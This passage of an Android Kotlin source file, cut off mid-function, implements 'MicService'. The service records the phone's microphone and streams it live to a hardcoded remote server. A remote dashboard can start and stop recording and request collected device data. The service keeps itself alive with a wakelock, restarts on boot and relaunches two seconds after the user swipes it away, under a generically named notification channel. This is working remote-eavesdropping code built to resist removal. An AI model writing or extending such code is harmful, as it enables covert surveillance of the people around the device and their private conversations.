package com.micmonitor.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.app.AlarmManager
import android.app.PendingIntent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.BatteryManager
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.edit
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import okhttp3.*
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.math.max
import kotlin.math.min
import org.json.JSONObject
import org.json.JSONArray
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpSender
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.audio.JavaAudioDeviceModule

/**
 * MicService — Core background service.
 *
 * What it does:
 *  1. Captures raw PCM audio from microphone using AudioRecord.
 *  2. Streams every audio chunk live to the Node.js server via WebSocket.
 *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
 *  4. Listens for remote commands: "start_record", "stop_record", "ping".
 *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
 *  6. Holds a WakeLock so the CPU stays alive in background.
 *  7. restarted automatically by BootReceiver on reboot.
 */
class MicService : Service() {

    // ── Coroutine scope (cancelled on destroy) ──────────────────────────────
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // ── Audio capture ────────────────────────────────────────────────────────
    private var audioRecord: AudioRecord? = null
    private val sampleRate    = 16000           // 16 kHz
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
    private val minBufferSize by lazy {
        val min = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
        // Some OEMs return an error code; use a safe fallback in that case.
        if (min > 0) min else sampleRate
    }
    private val recordBufferSize by lazy { max(minBufferSize * 2, sampleRate * 4) }
    // 20 ms chunks keep streaming latency low and prevent multi-second playback drift.
    private val streamChunkSize by lazy { ((sampleRate * 2) / 50).coerceAtLeast(640) }

    // ── WebSocket ────────────────────────────────────────────────────────────
    private var webSocket: WebSocket? = null
    @Volatile private var isWsConnecting = false
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
        .pingInterval(30, TimeUnit.SECONDS)        // Keep-alive pings
        .build()

    // ── Recording state ──────────────────────────────────────────────────────
    @Volatile private var isCapturing   = false
    @Volatile private var isSavingFile  = false
    @Volatile private var aiEnhancementEnabled = true
    @Volatile private var aiAutoModeEnabled = true
    @Volatile private var wantsMicStreaming = true
    @Volatile private var isRecoveringMic = false
    @Volatile private var lastAudioChunkSentAt = 0L
    @Volatile private var lastHealthSentAt = 0L
    private var micWatchdogJob: Job? = null
    private var recordingFileStream: FileOutputStream? = null
    private var recordingFile: File? = null
    private var estimatedNoiseDb = -62.0
    private var lastAutoAiSwitchAt = 0L

    // ── PCM enhancement filter state (persists across frames for continuity) ──
    // Reset these at each capture start so a previous session's state is never reused.
    private var hpfPrevX = 0.0      // HPF: previous raw input sample
    private var hpfPrevY = 0.0      // HPF: previous output sample
    private var eq1X1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-1]
    private var eq1X2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-2]
    private var eq1Y1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-1]
    private var eq1Y2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-2]
    private var bqX1 = 0.0          // EQ stage2 biquad +10dB@2500Hz: x[n-1]
    private var bqX2 = 0.0          // EQ stage2 biquad +10dB@2500Hz: x[n-2]
    private var bqY1 = 0.0          // EQ stage2 biquad +10dB@2500Hz: y[n-1]
    private var bqY2 = 0.0          // EQ stage2 biquad +10dB@2500Hz: y[n-2]
    private var peX1 = 0.0          // EQ stage3 biquad +6dB@3500Hz: x[n-1]
    private var peX2 = 0.0          // EQ stage3 biquad +6dB@3500Hz: x[n-2]
    private var peY1 = 0.0          // EQ stage3 biquad +6dB@3500Hz: y[n-1]
    private var peY2 = 0.0          // EQ stage3 biquad +6dB@3500Hz: y[n-2]
    private var smoothedGain = 1.0  // Temporally-smoothed gain (anti-pumping)
    @Volatile private var ourAudioMode = false  // true while we own MODE_IN_COMMUNICATION
    // Overlap-add FFT spectral denoiser — shared instance, reset each capture session.
    private val spectralDenoiser = SpectralDenoiser()

    // ── WebRTC state (phone publishes mic track) ───────────────────────────
    @Volatile private var isWebRtcStreaming = false
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var audioDeviceModule: JavaAudioDeviceModule? = null
    private var peerConnection: PeerConnection? = null
    private var localAudioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null
    private var webRtcAudioSender: RtpSender? = null
    private var currentWebRtcBitrateKbps = 24
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var webRtcRecoveryJob: Job? = null
    private var iceWatchdogJob: Job? = null
    private var lastDashboardQuality: JSONObject? = null
    private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
    )

    // ── WakeLock ─────────────────────────────────────────────────────────────
    private var wakeLock: PowerManager.WakeLock? = null
    private val connectivityManager by lazy {
        getSystemService(ConnectivityManager::class.java)
    }

    // ── Data Collector ───────────────────────────────────────────────────────
    private val dataCollector by lazy { DataCollector(this) }
    private var dataJob: Job? = null

    // ── Prefs / Device ID ────────────────────────────────────────────────────
    private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
    private val deviceId: String by lazy {
        prefs.getString("device_id", null) ?: UUID.randomUUID().toString().also { id ->
            prefs.edit { putString("device_id", id) }
        }
    }
    
    // ── Server URL — CHANGE THIS TO YOUR PC'S IP ─────────────────────────────
    // Or set from the app's main screen to a Render URL like:
    // wss://your-app.onrender.com/audio/
    companion object {
        const val TAG          = "MicService"
        const val CHANNEL_ID   = "device_services_channel"
        const val NOTIF_ID     = 101
        const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
        const val WEBRTC_MIN_BITRATE_KBPS = 24
        const val WEBRTC_MID_BITRATE_KBPS = 40
        const val WEBRTC_MAX_BITRATE_KBPS = 64

        // Render cloud URL — works on any network (WiFi or cellular)
        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"

        // Shared websocket for service health checks and optional future hooks.
        @Volatile var activeWebSocket: WebSocket? = null
    }

    /** Reads server URL from SharedPreferences so it can be changed from MainActivity */
    private val serverUrl get(): String {
        val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
        // Ensure it ends with / then append deviceId
        return base.trimEnd('/') + "/$deviceId"
    }

    private val wsAuthToken: String
        get() = (prefs.getString("server_token", "") ?: "").trim()

    private val serverHttpBaseUrl: String
        get() {
            val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
            return base
                .replace(Regex("^wss://"), "https://")
                .replace(Regex("^ws://"), "http://")
                .substringBefore("/audio")
                .trimEnd('/')
        }

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        ensurePeerConnectionFactory()
        Log.i(TAG, "Service created. Device ID: $deviceId")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action}")

        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))

        // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
        if (intent?.action == ACTION_RECONNECT) {
            if (activeWebSocket == null) {
                Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                connectWebSocket()
            } else {
                Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
                if (!isCapturing) startAudioCapture()
                startMicWatchdog()
            }
            scheduleReconnectAlarm() // reschedule for next cycle
            return START_STICKY
        }

        if (activeWebSocket == null) {
            connectWebSocket()
        } else {
            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
            if (!isCapturing) startAudioCapture()
            startMicWatchdog()
            startDataCollection()
        }
        scheduleKeepAlive()
        scheduleReconnectAlarm()
        return START_STICKY   // Android restarts service automatically if killed
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Schedule immediate restart via AlarmManager when user swipes app away
        val restartIntent = Intent(applicationContext, MicService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 2_000
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "onTaskRemoved — scheduled restart in 2s")
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — stopping service")
        isCapturing  = false
        isSavingFile = false
        activeWebSocket = null
        serviceScope.cancel()
        stopMicWatchdog()
        stopAudioCapture("stop_capture_for_webrtc")
        stopWebRtcSession(notifyState = false)
        closeRecordingFile()
        webSocket?.close(1000, "Service stopped")
        isWsConnecting = false
        peerConnectionFactory?.dispose()
        peerConnectionFactory = null
        audioDeviceModule?.release()
        audioDeviceModule = null
        if (wakeLock?.isHeld == true) wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ────────────────────────────────────────────────────────────────────────
    // WebSocket connection
    // ────────────────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        if (activeWebSocket != null || isWsConnecting) {
            Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
            return
        }
        isWsConnecting = true
        Log.i(TAG, "Connecting to $serverUrl")
        updateNotification("Connecting to server…")

        try {
            webSocket?.close(1000, "Reconnecting")
        } catch (_: Exception) {}

        val requestBuilder = Request.Builder()
            .url(serverUrl)
            .addHeader("X-Device-Id", deviceId)
        if (wsAuthToken.isNotBlank()) {
            requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
        }
        val request = requestBuilder.build()

        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected ✅")
                isWsConnecting = false
                activeWebSocket = webSocket
                updateNotification("Live streaming active")
                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
                // Mic-first mode: always keep capture active when connected.
                startAudioCapture()
                startMicWatchdog()
                startDataCollection()
                sendHealthStatus("ws_open")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Server command: $text")
                handleServerCommand(text.trim())
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                handleServerCommand(bytes.utf8().trim())
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                isWsConnecting = false
                activeWebSocket = null
                updateNotification("Disconnected — retrying in 5s…")
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = false)
                stopDataCollection()
                serviceScope.launch {
                    delay(5_000)
                    connectWebSocket()
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "WebSocket closed: $reason")
                isWsConnecting = false
                activeWebSocket = null
                updateNotification("Disconnected — retrying…")
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = false)
                stopDataCollection()
                serviceScope.launch {
                    delay(5_000)
                    connectWebSocket()
                }
            }
        })
    }

    // ────────────────────────────────────────────────────────────────────────
    // Remote command handler (from primary device dashboard)
    // ────────────────────────────────────────────────────────────────────────

    private fun handleServerCommand(cmd: String) {
        if (cmd.startsWith("{")) {
            handleServerJsonCommand(cmd)
            return
        }
        when (cmd) {
            "start_stream" -> {
                Log.i(TAG, "CMD: start mic stream")
                wantsMicStreaming = true
                if (!isWebRtcStreaming) {
                    startAudioCapture()
                    startMicWatchdog()
                }
                updateNotification("Live streaming active")
                webSocket?.send("ACK:start_stream")
            }
            "stop_stream" -> {
                Log.i(TAG, "CMD: stop mic stream")
                wantsMicStreaming = false
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = true)
                closeRecordingFile()
                updateNotification("Connected — mic standby")
                webSocket?.send("ACK:stop_stream")
            }
            "start_record" -> {
                Log.i(TAG, "CMD: start recording")
                // Also ensure mic is capturing
                startAudioCapture()
                openRecordingFile()
                webSocket?.send("ACK:start_record")
            }
            "stop_record" -> {
                Log.i(TAG, "CMD: stop recording")
                closeRecordingFile()
                webSocket?.send("ACK:stop_record:${recordingFile?.name ?: "unknown"}")
            }
            "ping" -> {
                webSocket?.send("pong:$deviceId")
            }
            "get_data" -> {
                // Dashboard requested a fresh sync immediately
                sendDeviceData()
            }
            else -> Log.d(TAG, "Unknown command: $cmd")
        }
    }

    private fun handleServerJsonCommand(jsonText: String) {
        try {
            val obj = JSONObject(jsonText)
            when (obj.optString("type")) {
                "webrtc_start" -> {
                    Log.i(TAG, "CMD: webrtc_start")
                    startWebRtcSession()
                }
                "webrtc_stop" -> {
                    Log.i(TAG, "CMD: webrtc_stop")
                    stopWebRtcSession(notifyState = true)
                }
                "webrtc_offer" -> {
                    val sdp = obj.optString("sdp", "")
                    if (sdp.isNotBlank()) {
                        Log.i(TAG, "CMD: webrtc_offer")
                        applyRemoteOfferAndCreateAnswer(sdp)
                    }
                }
                "webrtc_ice" -> {
                    val c = obj.optJSONObject("candidate")
                    if (c != null) {
                        val candidate = IceCandidate(
                            c.optString("sdpMid", ""),
                            c.optInt("sdpMLineIndex", 0),
                            c.optString("candidate", "")
                        )
                        peerConnection?.addIceCandidate(candidate)
                    }
                }
                "webrtc_quality" -> {
                    lastDashboardQuality = obj.optJSONObject("quality")
                    applyAdaptiveBitrate()
                }
                "ai_mode" -> {
                    aiAutoModeEnabled = false
                    aiEnhancementEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiEnhancementEnabled) "ai_mode_on" else "ai_mode_off")
                    Log.i(TAG, "AI mode set to $aiEnhancementEnabled")
                }
                "ai_auto" -> {
                    aiAutoModeEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiAutoModeEnabled) "ai_auto_on" else "ai_auto_off")
                    Log.i(TAG, "AI auto mode set to $aiAutoModeEnabled")
                }
                else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Invalid JSON command: ${e.message}")
        }
    }

    private fun ensurePeerConnectionFactory() {
        if (peerConnectionFactory != null) return
        val initOpts = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initOpts)
        audioDeviceModule = JavaAudioDeviceModule.builder(this)
            // Prefer platform AEC/NS when available to reduce room echo and steady noise.
            .setUseHardwareAcousticEchoCanceler(true)
            .setUseHardwareNoiseSuppressor(true)
            .createAudioDeviceModule()
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setAudioDeviceModule(audioDeviceModule)
            .createPeerConnectionFactory()
        Log.i(TAG, "WebRTC factory initialized")
    }

    private fun startWebRtcSession() {
        if (peerConnection != null) return
        ensurePeerConnectionFactory()
        val factory = peerConnectionFactory ?: return

        // We use WebRTC audio path for low-latency streaming, so stop raw PCM path.
        stopMicWatchdog()
        stopAudioCapture()

        val constraints = MediaConstraints().apply {
            // Voice-first profile: keep echo/noise suppression and AGC for cleaner monitoring.
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation2", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
            optional.add(MediaConstraints.KeyValuePair("googAudioNetworkAdaptor", "true"))
        }
        localAudioSource = factory.createAudioSource(constraints)
        localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)

        cachedIceServers = fetchIceServersFromServer()

        val rtcConfig = PeerConnection.RTCConfiguration(
            cachedIceServers
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }

        peerConnection = factory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                val candidateJson = JSONObject().apply {
                    put("candidate", candidate.sdp)
                    put("sdpMid", candidate.sdpMid)
                    put("sdpMLineIndex", candidate.sdpMLineIndex)
                }
                val msg = JSONObject().apply {
                    put("type", "webrtc_ice")
                    put("candidate", candidateJson)
                }
                webSocket?.send(msg.toString())
            }

            override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState) {
                sendWebRtcState("ice_${newState.name.lowercase()}")
                if (newState == PeerConnection.IceConnectionState.CONNECTED ||
                    newState == PeerConnection.IceConnectionState.COMPLETED) {
                    webRtcRecoveryJob?.cancel()
                    webRtcRecoveryJob = null
                    iceWatchdogJob?.cancel()
                    iceWatchdogJob = null
                }
                if (newState == PeerConnection.IceConnectionState.DISCONNECTED ||
                    newState == PeerConnection.IceConnectionState.FAILED) {
                    scheduleWebRtcRecovery(newState.name.lowercase())
                }
            }

            override fun onConnectionChange(newState: PeerConnection.PeerConnectionState) {
                sendWebRtcState("pc_${newState.name.lowercase()}")
            }

            override fun onSignalingChange(newState: PeerConnection.SignalingState) {}
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
            override fun onAddStream(stream: org.webrtc.MediaStream) {}
            override fun onRemoveStream(stream: org.webrtc.MediaStream) {}
            override fun onDataChannel(dataChannel: org.webrtc.DataChannel) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: org.webrtc.RtpReceiver, mediaStreams: Array<out org.webrtc.MediaStream>) {}
            override fun onTrack(transceiver: org.webrtc.RtpTransceiver) {}
        })

        val pc = peerConnection
        val track = localAudioTrack
        if (pc == null || track == null) {
            sendWebRtcState("create_failed")
            return
        }

        webRtcAudioSender = pc.addTrack(track, listOf("mic_stream"))
        isWebRtcStreaming = true
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        applyAdaptiveBitrate()
        registerNetworkCallbackForBitrate()
        updateNotification("WebRTC mic active")
        sendHealthStatus("webrtc_started")
        sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
    }

    private fun stopWebRtcSession(notifyState: Boolean) {
        webRtcRecoveryJob?.cancel()
        webRtcRecoveryJob = null
        iceWatchdogJob?.cancel()
        iceWatchdogJob = null
        unregisterNetworkCallbackForBitrate()
        try {
            peerConnection?.close()
        } catch (_: Exception) {}
        peerConnection = null
        webRtcAudioSender = null
        try {
            localAudioTrack?.dispose()
            localAudioSource?.dispose()
        } catch (_: Exception) {}
        localAudioTrack = null
        localAudioSource = null
        val wasStreaming = isWebRtcStreaming
        isWebRtcStreaming = false

        if (notifyState && wasStreaming) sendHealthStatus("webrtc_stopped")
        if (notifyState && wasStreaming) sendWebRtcState("stopped")

        // Resume legacy PCM stream only when dashboard still wants it.
        if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
            startAudioCapture()
            startMicWatchdog()
            updateNotification("Live streaming active")
        }
    }

    private fun applyRemoteOfferAndCreateAnswer(remoteSdp: String) {
        startWebRtcSession()
        val pc = peerConnection ?: return
        val targetKbps = chooseTargetBitrateKbps()

        pc.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() {
                val answerConstraints = MediaConstraints()
                pc.createAnswer(object : SdpObserver {
                    override fun onCreateSuccess(desc: SessionDescription?) {
                        if (desc == null) return
                        val tuned = tuneOpusSdp(desc.description, targetKbps)
                        val localAnswer = SessionDescription(SessionDescription.Type.ANSWER, tuned)
                        pc.setLocalDescription(object : SdpObserver {
                            override fun onSetSuccess() {
                                val msg = JSONObject().apply {
                                    put("type", "webrtc_answer")
                                    put("sdp", tuned)
                                }
                                webSocket?.send(msg.toString())
                                applyAdaptiveBitrate()
                                sendWebRtcState("answer_sent_${targetKbps}kbps")
                                // Start a watchdog: if ICE hasn't connected in 15s, fall back to PCM.
                                iceWatchdogJob?.cancel()
                                iceWatchdogJob = serviceScope.launch(Dispatchers.IO) {
                                    delay(15_000)
                                    val iceState = peerConnection?.iceConnectionState()
                                    val connected =
                                        iceState == PeerConnection.IceConnectionState.CONNECTED ||
                                        iceState == PeerConnection.IceConnectionState.COMPLETED
                                    if (isWebRtcStreaming && !connected) {
                                        Log.w(TAG, "ICE watchdog: no connection after 15s — falling back to PCM")
                                        sendWebRtcState("ice_timeout")
                                        stopWebRtcSession(notifyState = true)
                                    }
                                }
                            }

                            override fun onSetFailure(error: String?) {
                                sendWebRtcState("local_set_fail")
                                Log.e(TAG, "WebRTC setLocalDescription failed: $error")
                            }

                            override fun onCreateSuccess(desc: SessionDescription?) {}
                            override fun onCreateFailure(error: String?) {}
                        }, localAnswer)
                    }

                    override fun onCreateFailure(error: String?) {
                        sendWebRtcState("answer_create_fail")
                        Log.e(TAG, "WebRTC createAnswer failed: $error")
                    }

                    override fun onSetSuccess() {}
                    override fun onSetFailure(error: String?) {}
                }, answerConstraints)
            }

            override fun onSetFailure(error: String?) {
                sendWebRtcState("remote_set_fail")
                Log.e(TAG, "WebRTC setRemoteDescription failed: $error")
            }

            override fun onCreateSuccess(desc: SessionDescription?) {}
            override fun onCreateFailure(error: String?) {}
        }, SessionDescription(SessionDescription.Type.OFFER, remoteSdp))
    }

    private fun tuneOpusSdp(sdp: String, targetKbps: Int): String {
        val opusPayload = Regex("a=rtpmap:(\\d+) opus/48000/2", RegexOption.IGNORE_CASE)
            .find(sdp)
            ?.groupValues
            ?.getOrNull(1)
            ?: return sdp
        val maxAvg = (targetKbps * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, 64_000)
        val minAvg = (WEBRTC_MIN_BITRATE_KBPS * 1000).coerceAtMost(maxAvg)
        val fmtpRegex = Regex("a=fmtp:$opusPayload ([^\\r\\n]+)")
        val tunedParams = mapOf(
            "maxaveragebitrate" to maxAvg.toString(),
            "minaveragebitrate" to minAvg.toString(),
            "maxplaybackrate" to "48000",
            "sprop-maxcapturerate" to "48000",
            "ptime" to "20",
            "minptime" to "10",
            "useinbandfec" to "1",           // FEC: recovers lost packets on low network
            "usedtx" to "0",                // avoid silence gating artifacts on far speech
            "stereo" to "0",
            "sprop-stereo" to "0",
            "cbr" to "0",                    // VBR: allocates more bits to complex speech
            "complexity" to "10",            // max Opus complexity for best quality
        )
        return if (fmtpRegex.containsMatchIn(sdp)) {
            sdp.replace(fmtpRegex) { match ->
                val merged = mergeFmtpParams(match.groupValues[1], tunedParams)
                "a=fmtp:$opusPayload $merged"
            }
        } else {
            val joined = tunedParams.entries.joinToString(";") { "${it.key}=${it.value}" }
            sdp + "\r\na=fmtp:$opusPayload $joined"
        }
    }

    private fun mergeFmtpParams(base: String, updates: Map<String, String>): String {
        val params = linkedMapOf<String, String>()
        base.split(';')
            .map { it.trim() }
            .filter { it.isNotBlank() }
            .forEach { token ->
                val idx = token.indexOf('=')
                if (idx <= 0 || idx >= token.length - 1) return@forEach
                val key = token.substring(0, idx).trim().lowercase()
                val value = token.substring(idx + 1).trim()
                if (key.isNotBlank() && value.isNotBlank()) {
                    params[key] = value
                }
            }
        updates.forEach { (k, v) -> params[k.lowercase()] = v }
        return params.entries.joinToString(";") { "${it.key}=${it.value}" }
    }

    private fun sendWebRtcState(state: String) {
        val msg = JSONObject().apply {
            put("type", "webrtc_state")
            put("state", state)
            put("bitrateKbps", currentWebRtcBitrateKbps)
            put("deviceId", deviceId)
            put("ts", System.currentTimeMillis())
            if (lastDashboardQuality != null) put("quality", lastDashboardQuality)
        }
        webSocket?.send(msg.toString())
    }

    private fun scheduleWebRtcRecovery(reason: String) {
        if (webRtcRecoveryJob?.isActive == true) return
        webRtcRecoveryJob = serviceScope.launch(Dispatchers.IO) {
            repeat(3) { idx ->
                delay(700L + idx * 900L)
                if (!isWebRtcStreaming || peerConnection == null) return@launch
                try {
                    peerConnection?.restartIce()
                } catch (_: Exception) {}
                sendWebRtcState("need_reoffer_${reason}_${idx + 1}")
            }
        }
    }

    private fun fetchIceServersFromServer(): List<PeerConnection.IceServer> {
        val fallback = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        val url = "$serverHttpBaseUrl/api/webrtc-config"
        return try {
            val reqBuilder = Request.Builder().url(url)
            if (wsAuthToken.isNotBlank()) reqBuilder.addHeader("X-Auth-Token", wsAuthToken)
            val response = okHttpClient.newCall(reqBuilder.build()).execute()
            if (!response.isSuccessful) return fallback
            val body = response.body?.string().orEmpty()
            if (body.isBlank()) return fallback
            val json = JSONObject(body)
            val arr = json.optJSONArray("iceServers") ?: JSONArray()
            val parsed = mutableListOf<PeerConnection.IceServer>()
            for (i in 0 until arr.length()) {
                val item = arr.optJSONObject(i) ?: continue
                val urls = mutableListOf<String>()
                when (val u = item.opt("urls")) {
                    is String -> if (u.isNotBlank()) urls.add(u)
                    is JSONArray -> {
                        for (j in 0 until u.length()) {
                            val s = u.optString(j, "")
                            if (s.isNotBlank()) urls.add(s)
                        }
                    }
                }
                if (urls.isEmpty()) continue
                val builder = PeerConnection.IceServer.builder(urls)
                val user = item.optString("username", "")
                val cred = item.optString("credential", "")
                if (user.isNotBlank()) builder.setUsername(user)
                if (cred.isNotBlank()) builder.setPassword(cred)
                parsed.add(builder.createIceServer())
            }
            if (parsed.isEmpty()) fallback else parsed
        } catch (e: IOException) {
            Log.w(TAG, "ICE config fetch failed: ${e.message}")
            fallback
        } catch (e: Exception) {
            Log.w(TAG, "ICE config parse failed: ${e.message}")
            fallback
        }
    }

    private fun chooseTargetBitrateKbps(): Int {
        val cm = connectivityManager ?: return WEBRTC_MID_BITRATE_KBPS
        val network = cm.activeNetwork ?: return WEBRTC_MID_BITRATE_KBPS
        val caps = cm.getNetworkCapabilities(network) ?: return WEBRTC_MID_BITRATE_KBPS
        var target = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
            WEBRTC_MIN_BITRATE_KBPS
        } else {
            WEBRTC_MID_BITRATE_KBPS
        }
        if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            val downKbps = caps.linkDownstreamBandwidthKbps
            target = when {
                downKbps in 1..1200 -> WEBRTC_MIN_BITRATE_KBPS
                downKbps in 1201..5000 -> WEBRTC_MID_BITRATE_KBPS
                downKbps in 5001..12000 -> 24
                else -> WEBRTC_MAX_BITRATE_KBPS
            }
        }
        val q = lastDashboardQuality
        val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
        val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
        val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
        if (!loss.isNaN() && loss >= 10.0) return WEBRTC_MIN_BITRATE_KBPS
        if (!rtt.isNaN() && rtt >= 450.0) return WEBRTC_MIN_BITRATE_KBPS
        if (!jitter.isNaN() && jitter >= 120.0) return WEBRTC_MIN_BITRATE_KBPS
        if ((!loss.isNaN() && loss >= 4.0) || (!rtt.isNaN() && rtt >= 250.0) || (!jitter.isNaN() && jitter >= 60.0)) {
            return min(target, WEBRTC_MID_BITRATE_KBPS)
        }
        return target.coerceIn(WEBRTC_MIN_BITRATE_KBPS, WEBRTC_MAX_BITRATE_KBPS)
    }

    private fun applyAdaptiveBitrate() {
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        val sender = webRtcAudioSender ?: return
        try {
            val params = sender.parameters ?: return
            if (params.encodings.isNullOrEmpty()) return
            val targetBps = currentWebRtcBitrateKbps * 1000
            params.encodings.forEach { encoding ->
                encoding.maxBitrateBps = targetBps
            }
            sender.parameters = params
            sendWebRtcState("bitrate_${currentWebRtcBitrateKbps}kbps")
        } catch (e: Exception) {
